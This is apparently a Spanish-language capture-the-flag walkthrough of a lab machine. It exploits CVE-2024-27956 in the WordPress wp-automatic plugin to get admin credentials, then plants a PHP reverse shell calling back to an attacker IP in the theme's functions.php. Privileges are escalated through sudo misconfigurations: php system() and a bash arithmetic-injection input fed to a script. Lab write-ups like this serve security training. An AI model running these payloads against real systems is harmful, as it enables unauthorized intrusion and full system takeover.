## Reconocimiento:

Puerto 80/http

La pagina esta hecha con WordPress y el panel de login está expuesto

```bash
http://172.17.0.2/wp-login.php
```

Si vamos a la pagina web, veremos una pagina normal, pero si nos vamos hasta abajo veremos la versión que esta utilizando:

`Created by Master 2024 && Automated By wp-automatic 3.92.0`

Esta versión tiene un CVE, concretamente CVE-2024-27956-RCE

https://github.com/diego-tella/CVE-2024-27956-RCE

```bash
python3 exploit.py http://172.17.0.2 
```

Este nos genera unas credenciales para el panel de wordpress:

User = eviladmin

Pass = admin

Dentro del panel:

```bash
Appearence > Theme File Editor > functions.php
```

Nos ponemos a la escucha. Vamos a aprovechar que podemos editar el archivo e insertamos una shell:

```bash
nc -lvnp <PORT>
```

```bash
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Le damos Update File y recibimos conexióna como usuario www-data.

## Escalada www-data → Pylon

```bash
sudo -l
(pylon) NOPASSWD: /usr/bin/php
```

Se puede ejecutar el binario php como el usuario pylon:

```bash
CMD="/bin/bash"
sudo -u pylon php -r "system('$CMD');"
```

## Escalada pylon → mario

```bash
sudo -l
(mario) NOPASSWD: /bin/bash /home/mario/pingusorpresita.sh
```

Hay un archivo interesante que se puede ejecutar con el binario /bin/bash.

Leyéndolo hay una linea que interesa y se puede explotar:

```bash
if [[ $num -eq 1 ]]
```

Asi que ejecutando el archivo le podemos dar un input malicioso y aprovechar la vulnerabilidad:

```bash
sudo -u mario bash /home/mario/pingusorpresita.sh
test[$(/bin/bash >&2)]+1
```

## Escalada mario → root

```bash
sudo -l
(root) NOPASSWD: /bin/bash /home/pylon/pingusorpresita.sh
```

Se usa la misma técnica y listo.
